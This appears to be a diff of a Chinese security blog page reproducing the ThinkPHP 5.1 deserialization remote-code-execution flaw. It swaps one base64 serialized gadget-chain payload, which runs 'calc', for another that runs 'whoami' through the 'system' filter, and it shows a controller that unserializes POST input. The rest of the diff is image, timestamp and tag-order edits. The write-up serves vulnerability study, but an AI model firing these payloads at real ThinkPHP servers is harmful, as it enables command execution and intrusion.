@@ -20,7 +20,7 @@
 <meta property="og:description" content="复现tp5.2.x反序列化之前先复现下tp5.1的反序列化漏洞">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2019/10/06/eGNJM8hvgXEScFr.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/07/2GU1iSlb6JWhmjk.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/08/NuviyVGamsD2UWK.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/06/ETxkzIYe9chFLwM.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/06/KUgYnhR4D9lasix.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/06/GHirXPzKFtm4CTa.png">
@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/10/07/U6A7KqJNHCMSFo5.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/07/shduAywJ3p26c7o.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/07/l4pkceZn36aVyxh.png">
-<meta property="og:updated_time" content="2019-10-08T01:17:23.891Z">
+<meta property="og:updated_time" content="2019-10-08T09:22:58.738Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ThinkPHP5.1反序列化复现">
 <meta name="twitter:description" content="复现tp5.2.x反序列化之前先复现下tp5.1的反序列化漏洞">
@@ -207,9 +207,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $u = unserialize(base64_decode($_POST[&apos;c&apos;]));</span><br><span class="line">        return &apos;hhh&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5.1.37/public/?ethan=calc</span><br><span class="line">POST:</span><br><span class="line">c=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czo4OiJjYWxjLmV4ZSI7aToxO3M6NDoiY2FsYyI7fX1zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjU6ImV0aGFuIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czowOiIiO319fX19fQ==</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5.1.37/public/?ethan=whoami</span><br><span class="line">POST:</span><br><span class="line">c=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToxOntpOjA7aToxO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo4O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2019/10/07/2GU1iSlb6JWhmjk.png" alt="Snipaste_2019-10-07_14-21-24.png"></p>
+<p><img src="https://i.loli.net/2019/10/08/NuviyVGamsD2UWK.png" alt="Snipaste_2019-10-08_17-21-44.png"></p>
 <h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
 <p>php反序列化</p>
 </blockquote>
@@ -556,10 +556,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
@@ -569,6 +565,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CVE</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -584,11 +584,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">cms</a>
+                <a href="javascript:void(0)" class="js-tag color4">RCE</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">RCE</a>
+                <a href="javascript:void(0)" class="js-tag color4">cms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -612,7 +612,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">cbc字节翻转攻击</a>
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -620,7 +620,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -637,6 +637,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">cbc字节翻转攻击</a>
               </li>
              
               <li class="article-tag-list-item">
